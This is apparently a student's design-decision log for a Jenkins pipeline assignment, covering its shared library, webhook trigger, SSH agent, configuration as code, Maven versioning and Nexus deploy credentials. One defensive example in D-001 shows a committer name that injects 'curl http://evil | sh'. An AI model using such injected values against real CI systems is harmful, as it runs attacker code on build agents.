# Decisions

Each significant decision gets one entry. Newest at the bottom.

---

## D-001: Shared library location — same repo, subfolder via `libraryPath`

- **Date:** 2026-11-10
- **Context:** The task requires a Groovy Shared Library with a `prepareEnv` function (R-6, R-7).
  The library must live in some SCM location that Jenkins loads as a Global Pipeline Library.
- **Options considered:**
  1. Separate repository — pros: library and app have separate write access (clear trust
     boundary); this is the layout shown in the Jenkins handbook. Cons: second repo to submit
     and keep in sync; the reviewer has to clone two repos.
  2. Same repository, subfolder `1-jenkins-pipeline/shared-library/`, loaded with the
     `libraryPath` option of the SCM retriever — pros: one repo to submit and review; library
     and pipeline change together. Cons: the trust boundary is lost (see Risk below).
- **Decision:** Option 2 — same repo, `libraryPath: "1-jenkins-pipeline/shared-library/"`,
  configured with JCasC under `unclassified.globalLibraries.libraries[].retriever.modernSCM`.
- **Why:** A single repo is simpler to submit, review and run, and the assignment asks for one
  public repo.
- **Risk — trust boundary:**
  - Global Pipeline Libraries are *trusted*: they run outside the Groovy sandbox and can call any
    Jenkins/Java API. The Jenkins handbook warns that anyone who can push to the library's
    repository can get unlimited access to Jenkins.
  - With the library in the same repo as the app code, anyone who can push app code can also
    change trusted library code. In practice, write access to the app repo becomes
    admin-level access to Jenkins.
  - Related plugin hardening: CVE-2022-29047 / SECURITY-1951 (Jenkins advisory 2022-04-12).
    The `library` step with a retriever pointing to the *same repository and revision* as the
    current build let untrusted pull-request authors change Pipeline behavior in Multibranch
    jobs. Fixed versions (`workflow-cps-global-lib` 566.vd0a_a_3334a_555 / 2.21.3) abort
    retrieval when that revision is untrusted. This fix does **not** protect our setup: we use a
    Global Library on a normal pipeline job, so a push to `main` changes trusted code with no
    extra check. The advisory shows that the Jenkins project treats "library in the same repo
    as the code it builds" as a real attack path.
- **Mitigations in this assignment:**
  - Single owner repo; only I can push to `main`.
  - `defaultVersion: main` and `allowVersionOverride: false`: a Jenkinsfile cannot load the
    library from another branch.
  - `implicit: false`: the Jenkinsfile loads the library explicitly with `@Library`, so
    readers can see where it comes from.
  - `libraryPath` rejects `..` and absolute paths, so the library cannot point outside the repo.
  - Trigger data is handled as data, never as code. Committer name, commit message, branch
    and sha come from the SCM and are attacker-controlled (anyone can set `git config user.name`
    to any string). Rule for the library and the Jenkinsfile:
    - Pass these values only as environment variables.
    - Never put them into a Groovy-interpolated shell string.
    - Maven reads them directly (`${env.SCM_COMMITTER}` in `pom.xml`), with no shell involved.

    ```groovy
    // UNSAFE: Groovy inserts the value before the shell parses the command.
    // A committer named  x; curl http://evil | sh  runs a second command on the agent.
    sh "echo Built by ${env.SCM_COMMITTER}"

    // SAFE: single quotes, no Groovy interpolation; the shell expands the variable as data.
    sh 'echo "Built by $SCM_COMMITTER"'
    ```
- **What I would do in production:**
  - Separate library repository with restricted write access (a small platform team, CODEOWNERS,
    branch protection, required reviews).
  - Release the library as tagged versions and pin them in the Jenkinsfile
    (`@Library('tase-shared-lib@v1.2.0') _`), with tag protection rules.
  - Keep `allowVersionOverride` off for trusted libraries, or use folder-level (sandboxed)
    libraries for code that teams own themselves.
- **Trade-offs:** Simpler submission in exchange for a weaker trust boundary. This is
  acceptable for a single-author demo and documented here.
- **Sources:**
  - https://www.jenkins.io/doc/book/pipeline/shared-libraries/
  - https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#injection-via-interpolation
  - https://javadoc.jenkins.io/plugin/pipeline-groovy-lib/org/jenkinsci/plugins/workflow/libs/SCMBasedRetriever.html
  - https://github.com/jenkinsci/pipeline-groovy-lib-plugin (SCMBasedRetriever.java, help-libraryPath.html)
  - https://github.com/jenkinsci/configuration-as-code-plugin/tree/master/demos/pipeline-groovy-lib
  - https://www.jenkins.io/security/advisory/2022-04-12/#SECURITY-1951
  - https://nvd.nist.gov/vuln/detail/CVE-2022-29047

---

## D-002: SCM trigger — GitHub webhook → smee.io → Generic Webhook Trigger

- **Date:** 2026-11-10
- **Context:** R-2 (trigger from SCM change) and R-8 (`prepareEnv` passes SCM *trigger
  parameters*, e.g. the committer, into the pipeline). Jenkins runs locally behind NAT (home
  router + WSL2/Docker Desktop), so GitHub cannot open a connection to it.
- **Options considered:** Generic Webhook Trigger (GWT) + smee.io relay. Briefly rejected:
  the GitHub plugin (`githubPush()`) and `pollSCM` — neither passes the trigger payload into
  the pipeline, so they do not meet R-8 as written.
- **Decision:** GWT + smee.io. A `smee-client` container forwards GitHub `push` events to
  `http://jenkins:8080/generic-webhook-trigger/invoke`.
- **Why:** It is the only option where the SCM itself sends the parameters into the pipeline,
  which is what the task asks for. smee-client opens an *outbound* connection to smee.io, so no
  inbound port has to be opened on the router or the machine.
- **Details:**
  - Trigger defined in Job DSL (JCasC), not in the Jenkinsfile. A trigger in the Jenkinsfile is
    registered only after the first manual run.
  - Filter: only `refs/heads/main` (`regexpFilterText` / `regexpFilterExpression`).
  - Token stored as a Jenkins credential (`tokenCredentialId`), value from `.env`.
  - `prepareEnv` falls back to git (`git log -1`) when the build is started manually.
- **Security:**
  - Token-triggered builds run with SYSTEM privileges (documented by the plugin). Acceptable:
    the Jenkinsfile comes from my own repo.
  - The smee channel URL acts like a password: anyone who knows it can post a fake payload, and
    smee-client forwards it with the token. The URL is kept in `.env`, never committed.
  - smee.io is for development only. In production: a real inbound endpoint (reverse proxy /
    TLS) and HMAC verification of `X-Hub-Signature-256`.
- **Trade-offs:** Depends on a public third-party relay (smee.io) being available.
- **Sources:**
  - https://plugins.jenkins.io/generic-webhook-trigger/
  - https://docs.github.com/en/webhooks/testing-webhooks

---

## D-003: Interpretation of the task wording

- **Date:** 2026-11-10
- **Context:** Three phrases in the task text can be read in more than one way (R-3, R-4, R-5, R-8).
- **Decision:**
  1. "build an artifact" = compile + run unit tests (`mvnw compile test`).
     "pack the artifact" = create the jar (`mvnw package`).
  2. "upload to repo" = an artifact repository (Nexus, hosted Maven repo `maven-releases`),
     not a git repository.
  3. "who was the code committer" = the `committer` of the head commit in the push payload
     (`$.head_commit.committer.name`). Author and pusher are captured too, because they can be
     different people (e.g. a commit made in the GitHub web editor has committer "GitHub").
- **Why:** Each phrase maps 1:1 to a standard Maven lifecycle phase / GitHub payload field,
  with no custom steps.
- **Sources:**
  - https://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html
  - https://docs.github.com/en/webhooks/webhook-events-and-payloads#push

---

## D-004: Trigger parameters set and build description

- **Date:** 2026-11-10
- **Context:** R-8 — `prepareEnv` must pass SCM trigger parameters into the pipeline.
  We need a small, standard set that answers: what was built, from where, by whom.
- **Decision:** `prepareEnv` sets 7 environment variables:

  | Env var         | Push payload (JSONPath)          | Git fallback (manual run)         |
  |-----------------|----------------------------------|-----------------------------------|
  | `SCM_BRANCH`    | `$.ref` (strip `refs/heads/`)    | `git rev-parse --abbrev-ref HEAD` |
  | `SCM_COMMIT`    | `$.after`                        | `git rev-parse HEAD`              |
  | `SCM_COMMITTER` | `$.head_commit.committer.name`   | `git log -1 --format=%cn`         |
  | `SCM_AUTHOR`    | `$.head_commit.author.name`      | `git log -1 --format=%an`         |
  | `SCM_PUSHER`    | `$.pusher.name`                  | `manual`                          |
  | `SCM_REPO`      | `$.repository.full_name`         | from the remote URL               |
  | `SCM_MESSAGE`   | `$.head_commit.message`          | `git log -1 --format=%s`          |

  - All 7 are printed in the Prepare stage log.
  - 6 are embedded in `MANIFEST.MF` (all except `SCM_MESSAGE`: free text, can be multi-line).
  - Build description: `<short sha> by <committer>`, e.g. `9f3c2a1 by Reut Yadid`,
    set at the end of `prepareEnv` with `currentBuild.description`.
- **Why:**
  - Branch + commit: the minimum to reproduce what was built.
  - Committer, author, pusher: can be three different people; capturing all costs nothing.
  - `SCM_` prefix, not `GIT_`: the Jenkins Git plugin already sets `GIT_COMMIT`, `GIT_BRANCH`, ...
    Different names make it clear which values came from the webhook.
  - The build description shows who and which commit directly in the build history list.
- **Security / privacy:**
  - No e-mail addresses: the repo is public and artifacts are stored in Nexus; personal data
    that is not needed is not collected.
  - All values are attacker-controlled data: handled only as env vars, never in
    Groovy-interpolated shell strings (see D-001).
  - The build description is rendered by the default "Plain text" markup formatter, so HTML in a
    committer name is shown as text, not executed (no XSS). We keep that default.
- **Sources:**
  - https://docs.github.com/en/webhooks/webhook-events-and-payloads#push
  - https://plugins.jenkins.io/generic-webhook-trigger/
  - https://www.jenkins.io/doc/book/security/markup-formatter/

---

## D-005: Builds run on a dedicated agent; controller has 0 executors

- **Date:** 2026-11-10
- **Context:** Pipeline steps (`mvnw test`, `mvnw deploy`) run code from the repo. We must decide
  where that code executes (R-3, R-4, R-5).
- **Options considered:**
  1. Built-in node (controller executors > 0) — simplest, one container less. But builds get
     the same file-system access as the Jenkins process, including `JENKINS_HOME` (the
     encryption key and all stored credentials).
  2. Dedicated static agent container, controller executors = 0 — official recommendation
     (Controller Isolation). Separate file system, no access to `JENKINS_HOME`.
  3. Dynamic agents (Docker Cloud plugin) — clean container per build, but the controller needs
     the Docker socket, which is root-equivalent on the host. Too complex for this task.
- **Decision:** Option 2. One agent container based on the official `jenkins/ssh-agent:jdk21`
  image (JDK 21 included, no custom Dockerfile). Controller: `numExecutors: 0` in JCasC.
- **Why:** Follows the official Jenkins security guidance at the cost of one small container.
- **Trade-offs:** ~0.5–1 GB extra memory; one more connection to configure (see D-006).
- **Sources:**
  - https://www.jenkins.io/doc/book/security/controller-isolation/
  - https://www.jenkins.io/doc/book/using/using-agents/
  - https://hub.docker.com/r/jenkins/ssh-agent

---

## D-006: Agent connection — SSH, without host key verification

- **Date:** 2026-11-10
- **Context:** The controller must connect to the agent container from D-005, fully defined as
  code (JCasC), with no manual step after `docker compose up`.
- **Decision:** SSH launcher (SSH Build Agents plugin). The controller connects to the agent
  over the internal Docker network. Port 22 of the agent is **not** published to the host.
  - A script generates an ed25519 key pair (`ssh-keygen`) into a git-ignored folder.
  - Private key → Docker secret → JCasC reads it with `${readFile:/run/secrets/...}` into an
    SSH credential. A file, not an env var: JCasC docs warn that env vars are readable by
    jobs and admins.
  - Public key → `JENKINS_AGENT_SSH_PUBKEY` in `.env` (not a secret).
- **Why SSH:** Keys are known before startup, so the whole setup is declarative. An inbound
  agent (agent connects to controller) is also a common, valid approach — it is the standard for
  dynamic agents such as Kubernetes pods — but its secret is created by the controller only after
  it starts, so a static Compose setup needs an extra step to fetch it.
- **Host key verification:** `nonVerifyingKeyVerificationStrategy`.
  - Why: the official `jenkins/ssh-agent` image deletes its host keys at build time and creates
    new ones (`ssh-keygen -A`) every time the container starts, so the agent's host key changes on
    every re-create.
  - Risk: man-in-the-middle. Accepted here because port 22 is reachable only inside the private
    Docker network; an attacker would already need to be inside that network.
  - Alternative considered: "Manually trusted key" (trust on first use). Breaks after the agent
    container is re-created, unless the host keys are kept in an extra volume.
- **What I would do in production:** verify host keys — a fixed host key for the agent
  (mounted as a secret) with "Known hosts file" or "Manually provided key" verification; or use
  ephemeral inbound agents (e.g. Kubernetes), where there is no SSH host key at all.
- **Trade-offs:** Simpler setup in exchange for no host identity check on an internal network.
- **Sources:**
  - https://github.com/jenkinsci/ssh-agents-plugin/blob/main/doc/CONFIGURE.md
  - https://github.com/jenkinsci/docker-ssh-agent (setup-sshd, Dockerfile)
  - https://github.com/jenkinsci/configuration-as-code-plugin/blob/master/docs/features/secrets.adoc
  - https://www.jenkins.io/doc/book/using/using-agents/

---

## D-007: Jenkins setup as code — plugins.txt + JCasC + Job DSL

- **Date:** 2026-11-10
- **Context:** The reviewer must get a fully configured Jenkins with one command, without the
  setup wizard or clicks in the UI (README goal: running in under 5 minutes).
- **Options considered:**
  1. Manual setup in the UI — not reproducible, not reviewable in git. Rejected.
  2. Groovy init scripts (`init.groovy.d`) — imperative calls to internal Jenkins APIs; harder
     to read and fragile across versions. The older approach, replaced by JCasC.
  3. Everything as code — plugins, system configuration and jobs in files.
- **Decision:** Option 3, three layers:
  - **Plugins:** `plugins.txt` with pinned versions, installed in the Dockerfile with
    `jenkins-plugin-cli` (official image tooling).
  - **System configuration:** JCasC (`casc.yaml`) — admin user, `numExecutors: 0`, SSH agent,
    credentials, Global Pipeline Library. Setup wizard disabled with
    `-Djenkins.install.runSetupWizard=false`.
  - **Job:** the `jobs:` section of JCasC runs a Job DSL script that creates the pipeline job
    (SCM, `scriptPath`, Generic Webhook Trigger).
- **Why:**
  - `docker compose up` gives the same Jenkins every time; every setting is in a file I can
    explain line by line.
  - JCasC configures Jenkins itself; Job DSL creates jobs; the Jenkinsfile defines what the job
    does. JCasC delegates job creation to Job DSL — the pattern in the official JCasC demos.
  - A trigger defined in Job DSL is registered at startup, without a first manual run (D-002).
  - JCasC also has native `items:` support, but the official demo covers Freestyle jobs only;
    Job DSL is the documented way for pipeline jobs.
- **Not used:** Ansible. On a laptop it would only wrap `docker compose up` and add a
  prerequisite for the reviewer; it does not replace JCasC for configuring Jenkins. Its place in
  production (host provisioning) is noted in the README.
- **Security:** Secrets (admin password, SSH key, Nexus deploy password) are read from Docker
  secret files with `${readFile:...}`, not from environment variables.
- **Trade-offs:** Two DSLs to learn (JCasC YAML + Job DSL Groovy).
- **Sources:**
  - https://plugins.jenkins.io/configuration-as-code/
  - https://github.com/jenkinsci/configuration-as-code-plugin/tree/master/demos/jobs
  - https://github.com/jenkinsci/configuration-as-code-plugin/blob/master/docs/features/secrets.adoc
  - https://plugins.jenkins.io/job-dsl/
  - https://github.com/jenkinsci/docker/blob/master/README.md

---

## D-008: Java 21 everywhere; Maven 3.10.0 via Maven Wrapper

- **Date:** 2026-11-10
- **Context:** Jenkins LTS (2.568.x) runs only on Java 21 or 25. The agent image has a JDK but
  no Maven. We need one Java version and a reproducible way to get Maven (R-3, R-4, R-5).
- **Decision:**
  - **Java 21** for the controller, the agent and the app (`maven.compiler.release=21`).
  - **Maven 3.10.0** (latest stable; Maven 4 is still a preview "not safe for production").
  - Maven is provided by the **Maven Wrapper** (`mvnw`), committed in `app/`, type `source`.
    Both downloads are verified: `wrapperSha256Sum` (the wrapper jar) and
    `distributionSha256Sum` (the Maven zip).
  - Why type `source` (see T-001): `only-script` downloads `.zip` or `.tar.gz` depending on
    whether `unzip` exists, but takes one checksum; `script` needs `curl`/`wget` to fetch the
    wrapper jar. The agent image has none of these tools. With `source`, a small committed Java
    file (`MavenWrapperDownloader.java`) fetches the wrapper jar, and the jar downloads and
    unpacks the zip in Java — same file and checksum everywhere, no binary in git.
  - A Docker volume for the agent's `~/.m2` caches Maven and dependencies between builds.
- **Options considered (Maven on the agent):**
  1. Maven Wrapper — no custom agent image; same Maven version for me, the reviewer and CI;
     official Apache tool. Cost: one download (~10 MB) on the first build.
  2. Custom agent image with Maven — extra Dockerfile to maintain; the version lives in the
     image, not next to the code.
  3. Jenkins tool installer — ties the build to Jenkins; local builds may use another version.
- **Why:** One Java version removes "works on my machine" problems. Java 21 is the most widely
  adopted LTS and is supported by Jenkins until Sep 2027. The wrapper pins the Maven version in
  the repo, next to the code it builds.
- **Note:** No Java/Maven is installed in my WSL. The wrapper is generated once with the
  official `maven` Docker image; local builds and tests run on the agent image
  (`jenkins/ssh-agent:9.3.2-jdk21`), so they exercise exactly what CI runs (command in T-001).
- **Trade-offs:** Java 25 has a longer support window (Jenkins until Sep 2029) but less tooling
  maturity today.
- **Sources:**
  - https://www.jenkins.io/doc/book/platform-information/support-policy-java/
  - https://maven.apache.org/download.cgi
  - https://maven.apache.org/tools/wrapper/

---

## D-009: Unique version per build — CI-friendly `${revision}` + flatten-maven-plugin

- **Date:** 2026-11-10
- **Context:** Nexus `maven-releases` rejects re-deploying an existing version (HTTP 400), so
  every build must deploy a new version (R-5).
- **Options considered:**
  1. CI-friendly `${revision}` + `flatten-maven-plugin` — version from the build number;
     `pom.xml` in git is never changed. Cost: ~15 lines of plugin config.
  2. SNAPSHOT to `maven-snapshots` — no extra config, but not a release artifact, usually
     cleaned up, and not linked to a build number.
  3. `versions:set` before deploy — no plugin in the POM, but the POM in the workspace is
     changed during the build.
- **Decision:** Option 1.
  - `pom.xml`: `<version>${revision}</version>`, default `<revision>1.0.0-SNAPSHOT</revision>`
    so local builds work.
  - Jenkinsfile: `-Drevision=1.0.${BUILD_NUMBER}` → `1.0.12`, `1.0.13`, ...
  - `flatten-maven-plugin` in `resolveCiFriendliesOnly` mode writes `.flattened-pom.xml` with
    the real version, and that file is the POM deployed to Nexus.
- **Why:**
  - Every artifact in Nexus maps directly to the Jenkins build that produced it.
  - Without flatten, Maven 3 deploys the POM as-is, with the literal `${revision}` in it; the
    official docs say such artifacts are "not consumable by Maven". Maven 4 does this natively,
    but it is not GA yet.
- **Risks:**
  - Build numbers restart at 1 if the Jenkins volume is deleted (`docker compose down -v`); then
    deploy fails with HTTP 400 because `1.0.1` already exists. For the demo: reset Nexus and
    Jenkins volumes together (documented in README).
  - Pin a `flatten-maven-plugin` version released at least a few weeks ago (1.9.0 was released
    2026-11-06 — too new).
- **Trade-offs:** Extra plugin config in the POM, in exchange for an unchanged POM in git.
- **Sources:**
  - https://maven.apache.org/maven-ci-friendly.html
  - https://www.mojohaus.org/flatten-maven-plugin/

---

## D-010: Upload with `mvn deploy`

- **Date:** 2026-11-10
- **Context:** R-5 — upload the packed artifact to the artifact repository (Nexus).
- **Options considered:**
  1. `mvn deploy` — last phase of the Maven lifecycle; uploads the jar and the POM and updates
     the repository metadata. Target in `distributionManagement`, login in `settings.xml`.
  2. Nexus Artifact Uploader plugin — extra Jenkins dependency; every file, version and
     coordinate must be described again by hand.
  3. `curl` to the Nexus REST API — manual and fragile; POM and metadata are not handled.
- **Decision:** Option 1. One command in the Upload stage:
  `./mvnw -s settings.xml deploy -Drevision=1.0.${BUILD_NUMBER}`.
- **Why:** Standard Maven, maps 1:1 to "upload to repo", no extra plugin.
- **To verify when implemented (chunk C5):**
  - The `<id>` of the repository in `distributionManagement` must equal the `<server><id>` in
    `settings.xml`. Maven matches credentials only by this id; a mismatch sends the request
    without credentials and Nexus answers `401 Unauthorized`. Maven 3.10 is stricter: credentials
    are sent only to the server whose id matches.
  - Nexus is reached over plain HTTP inside the Docker network. Since Maven 3.8.1 the default
    `maven-default-http-blocker` mirror blocks HTTP repositories (CVE-2021-26291). It targets
    dependency downloads (ours come from Maven Central over HTTPS), but we verify that deploy over
    HTTP is not blocked. In production: HTTPS for Nexus.
- **Sources:**
  - https://maven.apache.org/plugins/maven-deploy-plugin/
  - https://maven.apache.org/settings.html#servers
  - https://maven.apache.org/docs/3.10.0/release-notes.html
  - https://maven.apache.org/docs/3.8.1/release-notes.html

---

## D-011: Nexus credentials — dedicated deploy user + `withCredentials` and `settings.xml`

- **Date:** 2026-11-10
- **Context:** `mvn deploy` (D-010) needs a Nexus login. We must choose which Nexus user deploys
  and how its password reaches Maven without leaking.
- **Decision — Nexus user:** a dedicated deploy user, not `admin` (least privilege).
  - `nexus/setup.sh` (bash + `curl` to the Nexus REST API) runs once after Nexus starts:
    1. Changes the initial random admin password (`/nexus-data/admin.password`) to the one in `.env`.
    2. Creates a role with only the privileges needed to deploy to `maven-releases`
       (exact minimal set verified in chunk C4 — docs and community answers disagree).
    3. Creates the deploy user with that role.
  - The script is idempotent (safe to run twice) and checked with `shellcheck`.
- **Decision — password to Maven:**
  - `settings.xml` is committed and holds no secret: `<server><id>nexus-releases</id>` with
    `${env.NEXUS_USER}` / `${env.NEXUS_PASSWORD}`.
  - The Jenkinsfile wraps only the deploy command in
    `withCredentials([usernamePassword(credentialsId: 'nexus-deploy', ...)])`; the values exist as
    env vars only during that command and are masked as `****` in the log.
  - Single-quoted `sh '...'` so Groovy does not interpolate the secret (see D-001).
- **Password path:** `.env` (git-ignored) → `setup.sh` creates the user; and → Docker secret file →
  JCasC `${readFile:...}` → Jenkins credential `nexus-deploy` → `withCredentials` → `settings.xml`
  → Nexus. Never in git, never in the log, never stored on the agent.
- **Options considered:**
  1. Deploy as `admin` — simplest, but a leak from Jenkins gives full control of Nexus. Rejected.
  2. Config File Provider plugin (managed `settings.xml` in Jenkins) — works, but an extra plugin
     and the file is not in git next to the code. Rejected.
- **To verify in chunk C3/C4:** whether recent Nexus Community Edition requires EULA acceptance
  before use, and how to automate it. Not confirmed by an official source yet.
- **Sources:**
  - https://help.sonatype.com/repomanager3/nexus-repository-administration/access-control/privileges
  - https://help.sonatype.com/repomanager3/using-nexus-repository/uploading-components
  - https://www.jenkins.io/doc/pipeline/steps/credentials-binding/
  - https://maven.apache.org/settings.html#servers
